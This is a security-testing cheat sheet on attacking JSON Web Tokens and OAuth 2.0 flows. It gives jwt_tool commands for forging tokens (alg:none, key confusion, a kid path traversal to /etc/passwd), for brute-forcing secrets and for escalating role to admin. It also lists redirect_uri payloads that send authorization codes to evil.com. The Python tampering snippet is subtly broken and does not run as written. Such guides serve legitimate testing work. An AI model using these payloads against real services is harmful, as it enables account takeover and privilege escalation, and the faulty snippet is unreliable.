# JWT + OAuth 2.0 security testing

## JWT attack surface

### 1. Algorithm confusion

```bash
# alg:none — the classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack:   {"alg":"none","typ":"JWT"}.payload.  (empty signature)

# RS256 → HS256 key confusion
# If the server verifies HS256 using its RS256 public key
# you can sign with that public key as the HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# The server uses the contents of the file kid points at as the HMAC secret
```

### 2. Full jwt_tool usage

```bash
# Full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak-secret brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embedded JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT tampering

```python
import jwt
import base64

# Decode (without verifying)
header, payload, sig = jwt.split('.')

# Tamper with the payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 attack surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   Normal: https://app.com/callback?code=AUTH_CODE
   Attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via a missing state parameter
   No state parameter → the attacker binds their own code to the victim's session

3. Missing PKCE
   No code_challenge → authorization code interception attack

4. Token leaked via Referer
   The callback page loads external resources → the Referer header carries the code or token
```

### Implicit grant (deprecated but still deployed)

```text
1. access_token sits in the URL fragment → Referer leakage
2. The token lands in browser history → physical access risk
3. No client authentication → token substitution attack
```

### Client Credentials Grant

```text
1. client_secret disclosure (hardcoded in frontend or mobile builds)
2. Over-broad scope grants
3. No per-client rate limiting → brute-force enumeration
```

### General OAuth testing

```text
□ Test scope escalation: scope=read → scope=read%20write
□ Token replay: use an old access_token against new resources
□ Refresh token abuse: refresh_token renews indefinitely
□ Cross-tenant access: use tenant A's token against tenant B
□ Token leaked in logs, URLs or Referer headers
```

## Tools

```bash
# JWT testing
pip install jwt-tool pyjwt

# OAuth testing
# Burp Suite + the OAuth Scanner extension
# Postman for testing OAuth 2.0 flows

# Automation
# Entropy: automated JWT tampering plus OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
